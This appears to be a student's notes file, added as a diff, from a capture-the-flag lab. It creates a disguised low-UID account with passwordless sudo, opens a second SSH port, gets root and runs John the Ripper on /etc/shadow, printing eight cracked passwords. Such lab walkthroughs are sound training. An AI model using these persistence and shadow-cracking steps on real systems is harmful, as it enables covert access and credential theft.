@@ -1,0 +1,75 @@
+#Step 1:
+#1. Create user and a group, give UID and GID
+groupadd -g 11 sysd 
+
+adduser sysd -no-create-home -uid 11 -gid 11
+
+cd /etc
+
+less group   #verify sysd
+
+#2. Password
+sudo visudo #add sysd with NOPASSWD
+
+Adding user `sysd' ...
+Adding new user `sysd' (11) with group `sysd' ...
+Not creating home directory `/home/sysd'.
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+Changing the user information for sysd
+Enter the new value, or press ENTER for the default
+	Full Name []: 
+	Room Number []: 
+	Work Phone []: 
+	Home Phone []: 
+	Other []: 
+Is the information correct? [Y/n] y
+
+#5. sudo access without the need for a password
+root:etc\ $ su sysd
+
+#Step 2: Smooth Sailing
+nano /etc/ssh/sshd_config
+Port 22
+Port 2222
+
+#Step 3: Testing your Configuration Update
+service sshd restart
+
+#2.
+exit
+exit
+exit
+
+#3.
+sysadmin@UbuntuDesktop:~$ ssh sysd@192.168.6.105 -p 2222
+sysd@192.168.6.105's password: 
+
+#4.
+sysd@scavenger-hunt:/$ sudo su root
+
+You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0
+
+#Step 4: Crack All the Passwords
+#1.
+sysadmin@UbuntuDesktop:~$ ssh sysd@192.168.6.105 -p 2222
+sysd@192.168.6.105's password: 
+
+#2.
+root@scavenger-hunt:/# john /etc/shadow
+Created directory: /root/.john
+Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sysd123          (sysd)
+computer         (stallman)
+freedom          (babbage)
+trustno1         (mitnik)
+dragon           (lovelace)
+lakers           (turing)
+passw0rd         (sysadmin)
+Goodluck!        (student)
+8g 0:00:03:27 100% 2/3 0.03858g/s 540.9p/s 554.3c/s 554.3C/s Missy!..Jupiter!
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
